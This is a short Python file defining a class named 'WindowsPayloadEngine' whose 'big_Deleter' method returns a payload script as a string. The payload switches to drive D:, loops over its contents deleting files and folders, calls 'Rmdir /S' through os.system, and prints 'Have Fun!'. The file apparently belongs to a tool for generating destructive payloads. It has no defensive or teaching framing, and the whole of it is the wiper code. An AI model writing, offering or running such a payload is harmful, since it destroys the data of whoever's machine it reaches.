# import os
# import socket
# import getpass



class WindowsPayloadEngine():

    def big_Deleter(self):

        code = """
import os
        
os.chdir('D:\\\\')
cwd = os.getcwd()
files = os.listdir(cwd)

for file in files:
\ttry:
\t\tif os.path.isfile(file):
\t\t\tos.remove(file)
\t\telif os.path.isdir(file):
\t\t\tos.rmdir(file)
\t\telse:
\t\t\tpass
\texcept FileNotFoundError as e:
\t\tprint(e)
\tfinally:
\t\tos.system('cd D:\\\\')
\t\tos.system('Rmdir /S "*"')
\t\tprint('Have Fun!')"""

        return code

print('D:\\'+'\\')